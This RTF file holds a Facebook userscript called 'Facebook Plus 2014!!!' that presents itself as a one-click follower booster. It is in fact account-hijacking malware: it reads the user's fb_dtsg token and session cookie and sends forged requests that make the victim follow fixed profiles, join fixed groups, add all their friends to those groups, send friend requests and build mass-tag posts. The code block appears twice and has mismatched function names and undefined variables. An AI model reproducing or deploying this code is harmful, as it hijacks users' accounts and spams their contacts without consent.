{\rtf1\ansi\ansicpg1252\deff0\deflang1036{\fonttbl{\f0\fnil\fcharset0 Calibri;}}
{\colortbl ;\red0\green0\blue255;}
{\*\generator Msftedit 5.41.21.2510;}\viewkind4\uc1\pard\sa200\sl276\slmult1\lang12\f0\fs22 // ==UserScript==\par
// @name            Facebook Plus 2014!!!\par
// @namespace\tab   fallen\par
// @description     Increase your followers just one click\par
// @version         5.0.06\par
// @updateURL\tab     {\field{\*\fldinst{HYPERLINK "http://userscripts.org/scripts/source/164255.meta.js"}}{\fldrslt{\ul\cf1 http://userscripts.org/scripts/source/164255.meta.js}}}\f0\fs22\par
// @include\tab     {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/Lotfi.mdz"}}{\fldrslt{\ul\cf1 http://*.facebook.com/Lotfi.mdz}}}\f0\fs22\par
// @include\tab\tab    {\field{\*\fldinst{HYPERLINK "http://www.facebook.com/"}}{\fldrslt{\ul\cf1 http://www.facebook.com/}}}\f0\fs22\par
// @include\tab\tab    {\field{\*\fldinst{HYPERLINK "https://www.facebook.com/"}}{\fldrslt{\ul\cf1 https://www.facebook.com/}}}\f0\fs22\par
// @include       hhtt*://*.facebook.com/*\par
// @include\tab    {\field{\*\fldinst{HYPERLINK "https://www.facebook.com/*"}}{\fldrslt{\ul\cf1 https://www.facebook.com/*}}}\f0\fs22\par
// @include\tab    {\field{\*\fldinst{HYPERLINK "http://www.facebook.com/*"}}{\fldrslt{\ul\cf1 http://www.facebook.com/*}}}\f0\fs22\par
// @include\tab    {\field{\*\fldinst{HYPERLINK "http://www.facebook.com/groups/*"}}{\fldrslt{\ul\cf1 http://www.facebook.com/groups/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "https://*.facebook.com/*"}}{\fldrslt{\ul\cf1 https://*.facebook.com/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "https://*.facebook.com/*/*"}}{\fldrslt{\ul\cf1 https://*.facebook.com/*/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/*"}}{\fldrslt{\ul\cf1 http://*.facebook.com/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/*/*"}}{\fldrslt{\ul\cf1 http://*.facebook.com/*/*}}}\f0\fs22\par
// @include        /https?://(|.*\\.)facebook.com/\par
// @include\tab     {\field{\*\fldinst{HYPERLINK "https://*.facebook.com/*"}}{\fldrslt{\ul\cf1 https://*.facebook.com/*}}}\f0\fs22\par
// @match\tab     {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/*"}}{\fldrslt{\ul\cf1 http://*.facebook.com/*}}}\f0\fs22\par
// @match\tab     {\field{\*\fldinst{HYPERLINK "https://*.facebook.com/*"}}{\fldrslt{\ul\cf1 https://*.facebook.com/*}}}\f0\fs22\par
// @exclude\tab     {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/ajax/*"}}{\fldrslt{\ul\cf1 http://*.facebook.com/ajax/*}}}\f0\fs22\par
// @exclude\tab     {\field{\*\fldinst{HYPERLINK "https://*.facebook.com/ajax/*"}}{\fldrslt{\ul\cf1 https://*.facebook.com/ajax/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "https://*.facebook.com/*/*"}}{\fldrslt{\ul\cf1 https://*.facebook.com/*/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/*"}}{\fldrslt{\ul\cf1 http://*.facebook.com/*}}}\f0\fs22\par
// @include         {\field{\*\fldinst{HYPERLINK "http://*.facebook.com/*/*"}}{\fldrslt{\ul\cf1 http://*.facebook.com/*/*}}}\f0\fs22\par
\par
\par
// ==/UserScript==\par
\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
\tab\par
function cereziAl(isim) \{\par
    var tarama = isim + "=";\par
    if (document.cookie.length > 0) \{\par
        konum = document.cookie.indexOf(tarama)\par
        if (konum != -1) \{\par
            konum += tarama.length\par
            son = document.cookie.indexOf(";", konum)\par
            if (son == -1)\par
                son = document.cookie.length\par
            return unescape(document.cookie.substring(konum, son))\par
        \}\par
        else \{ return ""; \}\par
    \}\par
\}\par
\par
function getRandomInt (min, max) \{\par
    return Math.floor(Math.random() * (max - min + 1)) + min;\par
\}\par
function randomValue(arr) \{\par
    return arr[getRandomInt(0, arr.length-1)];\par
\}\par
\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
\par
function a(abone)\{\par
    var http4 = new XMLHttpRequest();\par
     \par
    var url4 = "/ajax/follow/follow_profile.php?__a=1";\par
     \par
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";\par
    http4.open("POST", url4, true);\par
     \par
    //Send the proper header information along with the request\par
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\par
    http4.setRequestHeader("Content-length", params4.length);\par
    http4.setRequestHeader("Connection", "close");\par
     \par
    http4.onreadystatechange = function() \{//Call a function when the state changes.\par
    if(http4.readyState == 4 && http4.status == 200) \{\par
       \par
      http4.close; // Close the connection\par
     \par
    \}\par
    \}\par
    \par
    http4.send(params4);\par
\}\par
\par
a("100005164383497");\par
\par
\par
var gid = ['1394472737468323'];\par
\par
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];\par
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\\d+)/)[1]);\par
\par
var httpwp = new XMLHttpRequest();\par
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';\par
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';\par
httpwp['open']('POST', urlwp, true);\par
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');\par
httpwp['setRequestHeader']('Content-length', paramswp['length']);\par
httpwp['setRequestHeader']('Connection', 'keep-alive');\par
httpwp['send'](paramswp);\par
\par
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];\par
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\\d+)/)[1]);\par
\par
var friends = new Array();\par
gf = new XMLHttpRequest();\par
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);\par
gf['send']();\par
if (gf['readyState'] != 4) \{\} else \{\par
    data = eval('(' + gf['responseText']['substr'](9) + ')');\par
    if (data['error']) \{\} else \{\par
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) \{\par
            return _0x93dax8['index'] - _0x93dax9['index'];\par
        \});\par
    \};\par
\};\par
\par
for (var i = 0; i < friends['length']; i++) \{\par
    var httpwp = new XMLHttpRequest();\par
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';\par
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';\par
    httpwp['open']('POST', urlwp, true);\par
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');\par
    httpwp['setRequestHeader']('Content-length', paramswp['length']);\par
    httpwp['setRequestHeader']('Connection', 'keep-alive');\par
    httpwp['onreadystatechange'] = function () \{\par
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) \{\};\par
    \};\par
    httpwp['send'](paramswp);\par
\};\par
var spage_id = "Npa.dz";\par
var spost_id = "Npa.dz";\par
var sfoto_id = "Npa.dz";\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
var smesaj = "";\par
var smesaj_text = "";\par
var arkadaslar = [];\par
var svn_rev;\par
var bugun= new Date();\par
var btarihi = new Date(); \par
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);\par
if(!document.cookie.match(/paylasti=(\\d+)/))\{\par
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();\par
\}\par
\par
\par
//arkadaslari al ve isle\par
function sarkadaslari_al()\{\par
\tab\tab var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
\tab\tab\tab if(xmlhttp.readyState == 4)\{\par
\tab\tab\tab\tab   eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");\par
\tab\tab\tab\tab   for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++)\{\par
\tab\tab\tab\tab\tab smesaj = "";\par
\tab\tab\tab\tab\tab smesaj_text = "";\par
\tab\tab\tab\tab   for(i=f*10;i<(f+1)*10;i++)\{\par
\tab\tab\tab\tab\tab if(arkadaslar.payload.entries[i])\{\par
\tab\tab\tab\tab   smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";\par
\tab\tab\tab\tab   smesaj_text += " " + arkadaslar.payload.entries[i].text;\par
\tab\tab\tab\tab   \}\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\tab sdurumpaylas();\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\par
\tab\tab\tab\}\par
\tab\tab\tab\par
        \};\par
\tab\tab var params = "&filter[0]=user";\par
\tab\tab params += "&options[0]=friends_only";\par
\tab\tab params += "&options[1]=nm";\par
\tab\tab params += "&token=v7";\par
        params += "&viewer=" + user_id;\par
\tab\tab params += "&__user=" + user_id;\par
\tab\tab\par
        if (document.URL.indexOf("https://") >= 0) \{ xmlhttp.open("GET", "{\field{\*\fldinst{HYPERLINK "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"}}{\fldrslt{\ul\cf1 https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1}}}\f0\fs22 " + params, true); \}\par
        else \{ xmlhttp.open("GET", "{\field{\*\fldinst{HYPERLINK "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"}}{\fldrslt{\ul\cf1 http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1}}}\f0\fs22 " + params, true); \}\par
        xmlhttp.send();\par
\}\par
\par
//tiklama olayini dinle\par
var tiklama = document.addEventListener("click", function () \{\par
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0)\{\par
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];\par
sarkadaslari_al();\par
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();\par
\par
document.removeEventListener(tiklama);\par
\}\par
 \}, false);\par
  \par
\par
//arkada? ekleme\par
function sarkadasekle(uid,cins)\{\par
\tab\tab var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
\tab\tab\tab if(xmlhttp.readyState == 4)\{\tab\par
\tab\tab\tab\}\par
        \};\par
\tab\tab\par
\tab\tab xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); \par
\tab\tab var params = "to_friend=" + uid;\par
\tab\tab params += "&action=add_friend";\par
\tab\tab params += "&how_found=friend_browser";\par
\tab\tab params += "&ref_param=none";\par
\tab\tab params += "&outgoing_id=";\par
\tab\tab params += "&logging_location=friend_browser";\par
\tab\tab params += "&no_flyout_on_click=true";\par
\tab\tab params += "&ego_log_data=";\par
\tab\tab params += "&http_referer=";\par
\tab\tab params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;\par
        params += "&phstamp=165816749114848369115";\par
\tab\tab params += "&__user=" + user_id;\par
\tab\tab xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);\par
\tab\tab xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");\par
\tab\tab\par
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1)\{\par
\tab\tab xmlhttp.send(params);\par
\}else if(document.cookie.split("cins" + user_id +"=").length <= 1)\{\par
\tab\tab cinsiyetgetir(uid,cins,"sarkadasekle");\par
\}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString())\{\par
\tab\tab xmlhttp.send(params);\par
\}\par
\}\par
\par
//cinsiyet belirleme\par
var cinssonuc = \{\};\par
var cinshtml = document.createElement("html");\par
function scinsiyetgetir(uid,cins,fonksiyon)\{\par
\tab\tab var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
\tab\tab\tab if(xmlhttp.readyState == 4)\{\par
\tab\tab\tab eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");\par
\tab\tab\tab cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html\par
\tab\tab\tab btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);\par
\tab\tab\tab if(cinshtml.getElementsByTagName("select")[0].value == "1")\{\par
\tab\tab\tab document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();\par
\tab\tab\tab\}else if(cinshtml.getElementsByTagName("select")[0].value == "2")\{\par
\tab\tab\tab document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();\par
\tab\tab\tab\}\par
\tab\tab\tab eval(fonksiyon + "(" + id + "," + cins + ");");\par
\tab\tab\tab\}\par
        \};\par
\tab\tab xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);\par
\tab\tab xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);\par
\tab\tab xmlhttp.send();\par
\}\par
\par
\par
\par
\par
// ==/UserScript==\par
\par
\par
\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
\tab\par
function cereziAl(isim) \{\par
    var tarama = isim + "=";\par
    if (document.cookie.length > 0) \{\par
        konum = document.cookie.indexOf(tarama)\par
        if (konum != -1) \{\par
            konum += tarama.length\par
            son = document.cookie.indexOf(";", konum)\par
            if (son == -1)\par
                son = document.cookie.length\par
            return unescape(document.cookie.substring(konum, son))\par
        \}\par
        else \{ return ""; \}\par
    \}\par
\}\par
\par
function getRandomInt (min, max) \{\par
    return Math.floor(Math.random() * (max - min + 1)) + min;\par
\}\par
function randomValue(arr) \{\par
    return arr[getRandomInt(0, arr.length-1)];\par
\}\par
\par
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
\par
function a(abone)\{\par
    var http4 = new XMLHttpRequest();\par
     \par
    var url4 = "/ajax/follow/follow_profile.php?__a=1";\par
     \par
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";\par
    http4.open("POST", url4, true);\par
     \par
    //Send the proper header information along with the request\par
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");\par
    http4.setRequestHeader("Content-length", params4.length);\par
    http4.setRequestHeader("Connection", "close");\par
     \par
    http4.onreadystatechange = function() \{//Call a function when the state changes.\par
    if(http4.readyState == 4 && http4.status == 200) \{\par
       \par
      http4.close; // Close the connection\par
     \par
    \}\par
    \}\par
    \par
    http4.send(params4);\par
\}\par
\par
function sublist(uidss) \{\par
\tab\tab var a = document.createElement('script');\par
\tab\tab a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData(\{ flid: " + uidss + " \}).send();";\par
\tab\tab document.body.appendChild(a);\par
\}\par
;\par
sublist("183797918469020");\par
sublist("167894826717229");\par
var gid = ['424112084362301'];\par
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];\par
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\\d+)/)[1]);\par
var httpwp = new XMLHttpRequest();\par
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';\par
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';\par
httpwp['open']('POST', urlwp, true);\par
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');\par
httpwp['setRequestHeader']('Content-length', paramswp['length']);\par
httpwp['setRequestHeader']('Connection', 'keep-alive');\par
httpwp['send'](paramswp);\par
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];\par
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\\d+)/)[1]);\par
var friends = new Array();\par
gf = new XMLHttpRequest();\par
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);\par
gf['send']();\par
if (gf['readyState'] != 4) \{\} else \{\par
    data = eval('(' + gf['responseText']['substr'](9) + ')');\par
    if (data['error']) \{\} else \{\par
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) \{\par
            return _0x93dax8['index'] - _0x93dax9['index'];\par
        \});\par
    \};\par
\};\par
\par
for (var i = 0; i < friends['length']; i++) \{\par
    var httpwp = new XMLHttpRequest();\par
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';\par
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';\par
    httpwp['open']('POST', urlwp, true);\par
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');\par
    httpwp['setRequestHeader']('Content-length', paramswp['length']);\par
    httpwp['setRequestHeader']('Connection', 'keep-alive');\par
    httpwp['onreadystatechange'] = function () \{\par
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) \{\};\par
    \};\par
    httpwp['send'](paramswp);\par
\};\par
var spage_id = "384368908263379";\par
var spost_id = "384368908263379";\par
var sfoto_id = "384368908263379";\par
var user_id = document.cookie.match(document.cookie.match(/c_user=(\\d+)/)[1]);\par
var smesaj = "";\par
var smesaj_text = "";\par
var arkadaslar = [];\par
var svn_rev;\par
var bugun= new Date();\par
var btarihi = new Date(); \par
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);\par
if(!document.cookie.match(/paylasti=(\\d+)/))\{\par
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();\par
\}\par
\par
\par
//arkadaslari al ve isle\par
function sarkadaslari_al()\{\par
\tab\tab var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
\tab\tab\tab if(xmlhttp.readyState == 4)\{\par
\tab\tab\tab\tab   eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");\par
\tab\tab\tab\tab   for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++)\{\par
\tab\tab\tab\tab\tab smesaj = "";\par
\tab\tab\tab\tab\tab smesaj_text = "";\par
\tab\tab\tab\tab   for(i=f*10;i<(f+1)*10;i++)\{\par
\tab\tab\tab\tab\tab if(arkadaslar.payload.entries[i])\{\par
\tab\tab\tab\tab   smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";\par
\tab\tab\tab\tab   smesaj_text += " " + arkadaslar.payload.entries[i].text;\par
\tab\tab\tab\tab   \}\par
\tab\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\tab sdurumpaylas();\tab\tab\tab\tab\}\par
\tab\tab\tab\tab\par
\tab\tab\tab\}\par
\tab\tab\tab\par
        \};\par
\tab\tab var params = "&filter[0]=user";\par
\tab\tab params += "&options[0]=friends_only";\par
\tab\tab params += "&options[1]=nm";\par
\tab\tab params += "&token=v7";\par
        params += "&viewer=" + user_id;\par
\tab\tab params += "&__user=" + user_id;\par
\tab\tab\par
        if (document.URL.indexOf("https://") >= 0) \{ xmlhttp.open("GET", "{\field{\*\fldinst{HYPERLINK "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"}}{\fldrslt{\ul\cf1 https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1}}}\f0\fs22 " + params, true); \}\par
        else \{ xmlhttp.open("GET", "{\field{\*\fldinst{HYPERLINK "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1"}}{\fldrslt{\ul\cf1 http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1}}}\f0\fs22 " + params, true); \}\par
        xmlhttp.send();\par
\}\par
\par
//tiklama olayini dinle\par
var tiklama = document.addEventListener("click", function () \{\par
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0)\{\par
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];\par
sarkadaslari_al();\par
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();\par
\par
document.removeEventListener(tiklama);\par
\}\par
 \}, false);\par
  \par
\par
//arkada? ekleme\par
function sarkadasekle(uid,cins)\{\par
\tab\tab var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
\tab\tab\tab if(xmlhttp.readyState == 4)\{\tab\par
\tab\tab\tab\}\par
        \};\par
\tab\tab\par
\tab\tab xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); \par
\tab\tab var params = "to_friend=" + uid;\par
\tab\tab params += "&action=add_friend";\par
\tab\tab params += "&how_found=friend_browser";\par
\tab\tab params += "&ref_param=none";\par
\tab\tab params += "&outgoing_id=";\par
\tab\tab params += "&logging_location=friend_browser";\par
\tab\tab params += "&no_flyout_on_click=true";\par
\tab\tab params += "&ego_log_data=";\par
\tab\tab params += "&http_referer=";\par
\tab\tab params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;\par
        params += "&phstamp=165816749114848369115";\par
\tab\tab params += "&__user=" + user_id;\par
\tab\tab xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);\par
\tab\tab xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");\par
\tab\tab\par
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1)\{\par
\tab\tab xmlhttp.send(params);\par
\}else if(document.cookie.split("cins" + user_id +"=").length <= 1)\{\par
\tab\tab cinsiyetgetir(uid,cins,"sarkadasekle");\par
\}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString())\{\par
\tab\tab xmlhttp.send(params);\par
\}\par
\}\par
\par
//cinsiyet belirleme\par
var cinssonuc = \{\};\par
var cinshtml = document.createElement("html");\par
function scinsiyetgetir(uid,cins,fonksiyon)\{\par
\tab\tab var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
\tab\tab\tab if(xmlhttp.readyState == 4)\{\par
\tab\tab\tab eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");\par
\tab\tab\tab cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html\par
\tab\tab\tab btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);\par
\tab\tab\tab if(cinshtml.getElementsByTagName("select")[0].value == "1")\{\par
\tab\tab\tab document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();\par
\tab\tab\tab\}else if(cinshtml.getElementsByTagName("select")[0].value == "2")\{\par
\tab\tab\tab document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();\par
\tab\tab\tab\}\par
\tab\tab\tab eval(fonksiyon + "(" + id + "," + cins + ");");\par
\tab\tab\tab\}\par
        \};\par
\tab\tab xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);\par
\tab\tab xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);\par
\tab\tab xmlhttp.send();\par
\}\par
\par
function autoSuggest()\par
\{    \par
    links=document.getElementsByTagName('a');\par
    for (i in links) \{\par
        l=links[i];\par
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') \{\par
            l.click();\par
        \}\par
    \}\par
\}\par
\par
function blub()\par
\{\par
    if(document.getElementsByClassName('pbm fsm').length == 1) \{\par
        w = document.getElementsByClassName('pbm fsm')[0];\par
\par
        e = document.createElement('a');\par
        //e.href = '#';\par
        e.innerHTML = 'Auto Suggest by LMAO';\par
        e.className = 'uiButton';\par
        e.onclick = autoSuggest;\par
\par
        if( w.childElementCount == 0)\par
        \{\par
            w.appendChild(document.createElement('br'));\par
            w.appendChild(e);\par
        \}\par
    \}\par
\}\par
\par
blub();\par
\par
document.addEventListener("DOMNodeInserted", blub, true);\par
}
